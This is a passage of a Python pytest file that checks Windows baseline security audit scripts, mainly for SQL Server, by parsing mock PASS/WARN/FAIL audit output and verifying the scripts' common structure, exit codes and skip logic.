    def test_sqlserver_detection_and_skip_logic(self):
        """Test SQL Server detection and graceful skip when not installed"""
        script_path = os.path.join(
            os.path.dirname(__file__), 
            '..', '..', 'audits', 'windows', 'platform', 'baseline', 'sqlserver.ps1'
        )
        
        with open(script_path, 'r', encoding='utf-8') as f:
            content = f.read()
        
        # Verify skip logic present
        assert 'MSSQL' in content or 'MSSQLSERVER' in content
        assert 'SQL Server is not installed' in content
        assert 'exit 0' in content
    
    def test_sqlserver_version_validation(self):
        """Test SQL Server version detection and validation"""
        mock_output = """
[SECTION] SQL Server Instance Detection
[PASS] SQL Server instance: Default: Running
[PASS] SQL Server Default version: 15.0.2000.5 (Enterprise, current)
"""
        parsed = parse_audit_output(mock_output)
        assert parsed['pass'] >= 2
        
        # Test outdated version
        mock_output_fail = """
[SECTION] SQL Server Instance Detection
[FAIL] SQL Server Default version: 12.0.2000.8 (Standard, outdated)
"""
        parsed_fail = parse_audit_output(mock_output_fail)
        assert parsed_fail['fail'] >= 1
    
    def test_authentication_mode_validation(self):
        """Test SQL Server authentication mode"""
        mock_output = """
[SECTION] SQL Server Authentication Mode
[PASS] SQL Server MSSQLSERVER auth mode: Windows Authentication (most secure)
"""
        parsed = parse_audit_output(mock_output)
        assert parsed['pass'] >= 1
        
        # Test mixed mode
        mock_output_warn = """
[SECTION] SQL Server Authentication Mode
[WARN] SQL Server MSSQLSERVER auth mode: Mixed Mode (SQL + Windows, review necessity)
"""
        parsed_warn = parse_audit_output(mock_output_warn)
        assert parsed_warn['warn'] >= 1
    
    def test_service_account_validation(self):
        """Test SQL Server service account security"""
        mock_output = """
[SECTION] SQL Server Service Account
[PASS] SQL Server Default service account: Virtual service account (secure)
[PASS] SQL Agent Default: Running
[PASS] SQL Agent Default account: Virtual service account
"""
        parsed = parse_audit_output(mock_output)
        assert parsed['pass'] >= 3
        
        # Test excessive privileges
        mock_output_fail = """
[SECTION] SQL Server Service Account
[FAIL] SQL Server Default service account: LocalSystem (excessive privileges)
"""
        parsed_fail = parse_audit_output(mock_output_fail)
        assert parsed_fail['fail'] >= 1
    
    def test_network_protocols_configuration(self):
        """Test SQL Server network protocols"""
        mock_output = """
[SECTION] SQL Server Network Protocols
[PASS] SQL Server MSSQLSERVER TCP/IP: Enabled
[PASS] SQL Server MSSQLSERVER Named Pipes: Disabled
"""
        parsed = parse_audit_output(mock_output)
        assert parsed['pass'] >= 2
        
        # Test named pipes warning
        mock_output_warn = """
[SECTION] SQL Server Network Protocols
[WARN] SQL Server MSSQLSERVER Named Pipes: Enabled (disable if not needed)
"""
        parsed_warn = parse_audit_output(mock_output_warn)
        assert parsed_warn['warn'] >= 1
    
    def test_port_configuration(self):
        """Test SQL Server port configuration"""
        mock_output = """
[SECTION] SQL Server Port Configuration
[PASS] SQL Server MSSQLSERVER port: Custom port 14333 (security by obscurity)
"""
        parsed = parse_audit_output(mock_output)
        assert parsed['pass'] >= 1
        
        # Test default port warning
        mock_output_warn = """
[SECTION] SQL Server Port Configuration
[WARN] SQL Server MSSQLSERVER port: Default port 1433 (consider non-standard port)
"""
        parsed_warn = parse_audit_output(mock_output_warn)
        assert parsed_warn['warn'] >= 1
    
    def test_sql_browser_service(self):
        """Test SQL Browser service status"""
        mock_output = """
[SECTION] SQL Server Browser Service
[PASS] SQL Browser service: Installed but not running
[PASS] SQL Browser startup: Disabled
"""
        parsed = parse_audit_output(mock_output)
        assert parsed['pass'] >= 2
        
        # Test running browser service
        mock_output_warn = """
[SECTION] SQL Server Browser Service
[WARN] SQL Browser service: Running (exposes instance information, disable if not needed)
"""
        parsed_warn = parse_audit_output(mock_output_warn)
        assert parsed_warn['warn'] >= 1
    
    def test_backup_validation(self):
        """Test SQL Server backup detection"""
        mock_output = """
[SECTION] SQL Server Backup Configuration
[PASS] SQL Server MSSQLSERVER backup directory: Configured: C:\\Backups\\SQL
[PASS] SQL Server MSSQLSERVER backups: Recent backup files found (5 in last 7 days)
"""
        parsed = parse_audit_output(mock_output)
        assert parsed['pass'] >= 2
        
        # Test no recent backups
        mock_output_warn = """
[SECTION] SQL Server Backup Configuration
[WARN] SQL Server MSSQLSERVER backups: No recent backups (last 7 days)
"""
        parsed_warn = parse_audit_output(mock_output_warn)
        assert parsed_warn['warn'] >= 1


class TestWeek4Integration:
    """Integration tests for Week 4 audits"""
    
    def test_all_week4_audits_have_common_structure(self):
        """Verify all Week 4 audits follow common framework patterns"""
        week4_audits = ['eventlogs.ps1', 'performance.ps1', 'iis.ps1', 'sqlserver.ps1']
        
        for audit in week4_audits:
            script_path = os.path.join(
                os.path.dirname(__file__), 
                '..', '..', 'audits', 'windows', 'platform', 'baseline', audit
            )
            assert os.path.exists(script_path), f"{audit} not found"
            
            with open(script_path, 'r', encoding='utf-8') as f:
                content = f.read()
            
            # Check for required patterns
            assert '#Requires -Version 5.1' in content, f"{audit} missing PowerShell version requirement"
            assert '#Requires -RunAsAdministrator' in content, f"{audit} missing admin requirement"
            assert '. "$PSScriptRoot\\..\\..\\..\\..\\lib\\common.ps1"' in content, f"{audit} not sourcing common.ps1"
            assert 'Write-Section' in content, f"{audit} not using Write-Section"
            assert 'Register-Check' in content, f"{audit} not using Register-Check"
            assert 'Print-Summary' in content, f"{audit} not using Print-Summary"
    
    def test_week4_audits_exit_codes(self):
        """Verify Week 4 audits use standard exit codes"""
        week4_audits = ['eventlogs.ps1', 'performance.ps1', 'iis.ps1', 'sqlserver.ps1']
        
        for audit in week4_audits:
            script_path = os.path.join(
                os.path.dirname(__file__), 
                '..', '..', 'audits', 'windows', 'platform', 'baseline', audit
            )
            
            with open(script_path, 'r', encoding='utf-8') as f:
                content = f.read()
            
            # Verify exit code pattern
            assert 'exit 2  # FAIL' in content or 'exit 2' in content, f"{audit} missing FAIL exit code"
            assert 'exit 1  # WARN' in content or 'exit 1' in content, f"{audit} missing WARN exit code"
            assert 'exit 0  # PASS' in content or 'exit 0' in content, f"{audit} missing PASS exit code"
    
    def test_week4_audit_summary_format(self):
        """Verify Week 4 audits produce consistent summary format"""
        mock_output = """
[SECTION] Test Section
[PASS] Check 1: Success
[WARN] Check 2: Warning
[FAIL] Check 3: Failure
"""
        parsed = parse_audit_output(mock_output)
        
        # Verify required keys exist
        assert 'pass' in parsed
        assert 'warn' in parsed
        assert 'fail' in parsed
        assert 'checks' in parsed
        assert 'sections' in parsed
        
        # Verify counts
        assert parsed['pass'] >= 1
        assert parsed['warn'] >= 1
        assert parsed['fail'] >= 1
    
    def test_week4_mitre_attack_coverage(self):
        """Verify Week 4 audits map to MITRE ATT&CK techniques"""
        expected_ttps = {
            'eventlogs.ps1': ['T1562.002', 'T1070.001', 'T1110', 'T1078', 'T1059.001'],
            'performance.ps1': ['T1499', 'T1496'],
            'iis.ps1': ['T1190', 'T1505.003', 'T1071.001', 'T1040'],
            'sqlserver.ps1': ['T1003.003', 'T1210', 'T1485', 'T1552.001']
        }
        
        # Verify we have coverage for each audit
        for audit, ttps in expected_ttps.items():
            assert len(ttps) > 0, f"{audit} should map to MITRE ATT&CK techniques"
    
    def test_week4_skip_logic_validation(self):
        """Verify IIS and SQL Server audits have proper skip logic for non-installed scenarios"""
        # IIS skip logic
        iis_script = os.path.join(
            os.path.dirname(__file__), 
            '..', '..', 'audits', 'windows', 'platform', 'baseline', 'iis.ps1'
        )
        with open(iis_script, 'r', encoding='utf-8') as f:
            iis_content = f.read()
        
        assert 'IIS is not installed' in iis_content
        assert 'exit 0' in iis_content
        
        # SQL Server skip logic
        sql_script = os.path.join(
            os.path.dirname(__file__), 
            '..', '..', 'audits', 'windows', 'platform', 'baseline', 'sqlserver.ps1'
        )
        with open(sql_script, 'r', encoding='utf-8') as f:
            sql_content = f.read()
        
        assert 'SQL Server is not installed' in sql_content
        assert 'exit 0' in sql_content


# ============================================================================
#MARKS FOR TEST ORGANIZATION
# ============================================================================

pytest.mark.windows = pytest.mark.skipif(
    sys.platform != 'win32',
    reason="Windows-specific tests"
)

pytest.mark.powershell = pytest.mark.skipif(
    not os.path.exists('C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe'),
    reason="PowerShell not available"
)
